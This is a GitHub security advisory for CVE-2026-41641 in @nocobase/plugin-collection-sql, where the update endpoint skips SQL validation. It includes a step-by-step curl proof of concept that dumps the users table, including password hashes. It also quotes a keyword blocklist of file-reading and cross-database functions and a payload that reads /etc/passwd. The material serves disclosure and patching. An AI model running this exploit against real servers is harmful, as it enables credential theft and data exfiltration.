# [H] @nocobase/plugin-collection-sql: SQL Validation Bypass Through Missing `checkSQL` Call

## Summary
Severity: High
Advisory: GHSA-wrwh-c28m-9jjh
CVE: CVE-2026-41641
CWE: CWE-284, CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-wrwh-c28m-9jjh
Type: github-advisory

## Affected
- npm: `@nocobase/plugin-collection-sql` — affected >=0 <2.0.39

## Details
## Summary

The `checkSQL()` validation function that blocks dangerous SQL keywords (e.g., `pg_read_file`, `LOAD_FILE`, `dblink`) is applied on the `collections:create` and `sqlCollection:execute` endpoints but is entirely missing on the `sqlCollection:update` endpoint. An attacker with collection management permissions can create a SQL collection with benign SQL, then update it with arbitrary SQL that bypasses all validation, and query the collection to execute the injected SQL and exfiltrate data.

**Affected component:** `@nocobase/plugin-collection-sql`
**Affected versions:** <= 2.0.32 (confirmed)
**Minimum privilege:** Collection management permissions (`pm.data-source-manager.collection-sql` snippet)

## Vulnerable Code

### `checkSQL` is applied on create and execute

`packages/plugins/@nocobase/plugin-collection-sql/src/server/resources/sql.ts`

```javascript
// Line 51-60 — execute action: checkSQL IS called
execute: async (ctx: Context, next: Next) => {
    const { sql } = ctx.action.params.values || {};
    try { checkSQL(sql); } catch (e) { ctx.throw(400, ctx.t(e.message)); }
    // ...
}
```

### `checkSQL` is NOT applied on update

```javascript
// Line 105-118 — update action: checkSQL IS NOT called
update: async (ctx: Context, next: Next) => {
    const transaction = await ctx.app.db.sequelize.transaction();
    try {
        const { upRes } = await updateCollection(ctx, transaction);
        // No checkSQL() call anywhere in this path!
        const [collection] = upRes;
        await collection.load({ transaction, resetFields: true });
        await transaction.commit();
    }
    // ...
}
```

### The `checkSQL` function itself

`packages/plugins/@nocobase/plugin-collection-sql/src/server/utils.ts:10-28`

```javascript
export const checkSQL = (sql: string) => {
  const dangerKeywords = [
    'pg_read_file', 'pg_write_file', 'pg_ls_dir', 'LOAD_FILE',
    'INTO OUTFILE', 'INTO DUMPFILE', 'dblink', 'lo_import', // ...
  ];
  sql = sql.trim().split(';').shift();
  if (!/^select/i.test(sql) && !/^with([\s\S]+)select([\s\S]+)/i.test(sql)) {
    throw new Error('Only supports SELECT statements or WITH clauses');
  }
  if (dangerKeywords.some((keyword) => sql.toLowerCase().includes(keyword.toLowerCase()))) {
    throw new Error('SQL statements contain dangerous keywords');
  }
};
```

## PoC

```bash
TOKEN="<admin_jwt_token>"

# Step 1: Create collection with valid SQL (passes checkSQL)
curl -s http://TARGET:13000/api/collections:create \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "exfil_collection",
    "sql": "SELECT 1 as id",
    "fields": [{"name": "id", "type": "integer"}],
    "template": "sql"
  }'

# Step 2: Verify checkSQL blocks dangerous SQL on create
curl -s http://TARGET:13000/api/collections:create \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "blocked", "sql": "SELECT pg_read_file('\''/etc/passwd'\'')", "fields": [], "template": "sql"}'
# Returns: 400 "SQL statements contain dangerous keywords"

# Step 3: Update with dangerous SQL — bypasses checkSQL entirely
curl -s "http://TARGET:13000/api/sqlCollection:update?filterByTk=exfil_collection" \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "sql": "SELECT * FROM users",
    "fields": [
      {"name": "id", "type": "integer"},
      {"name": "email", "type": "string"},
      {"name": "password", "type": "string"}
    ]
  }'
# Returns: 200 OK — no validation!

# Step 4: Query the collection to exfiltrate data
curl -s "http://TARGET:13000/api/exfil_collection:list" \
  -H "Authorization: Bearer $TOKEN"
# Returns: all rows from users table including password hashes
```

## Impact

- **Confidentiality:** Arbitrary `SELECT` queries exfiltrate any table. Confirmed dump of the `users` table including password hashes.
- **Integrity/Availability:** Although `checkSQL` strips after the first semicolon, dangerous single-statement operations like `SELECT ... INTO`, subqueries with side effects, or database-specific functions (`pg_read_file`, `LOAD_FILE`, `dblink`) are all accessible through the update bypass.
- **Privilege escalation:** On PostgreSQL, `dblink` enables lateral movement to other databases. `pg_read_file` reads arbitrary files from the database server filesystem.

## Fix Suggestion

1. **Add `checkSQL()` to the `update` action.** The one-line fix:
   ```javascript
   update: async (ctx: Context, next: Next) => {
       const { sql } = ctx.action.params.values || {};
       if (sql) {
           try { checkSQL(sql); } catch (e) { ctx.throw(400, ctx.t(e.message)); }
       }
       // ... existing code ...
   }
   ```

2. **Centralize validation in middleware** rather than per-action. Apply `checkSQL` in the resource middleware for any action that accepts a `sql` field, so future actions cannot accidentally skip it.

3. **Strengthen the blocklist.** The current list is missing `COPY` (PostgreSQL file I/O and RCE), `CREATE`, `ALTER`, `DROP`, `GRANT`, `SET`, and `EXECUTE`. Consider switching to a parser-based allowlist that only permits `SELECT` and `WITH ... SELECT` at the AST level rather than relying on keyword blocklisting.

## References
- https://github.com/nocobase/nocobase/security/advisories/GHSA-wrwh-c28m-9jjh
- https://nvd.nist.gov/vuln/detail/CVE-2026-41641
- https://github.com/nocobase/nocobase/pull/9134
- https://github.com/nocobase/nocobase/commit/851aee543efa894142e0f7be03eb55d9cec06a91
- https://github.com/nocobase/nocobase
- https://github.com/nocobase/nocobase/releases/tag/v2.0.39
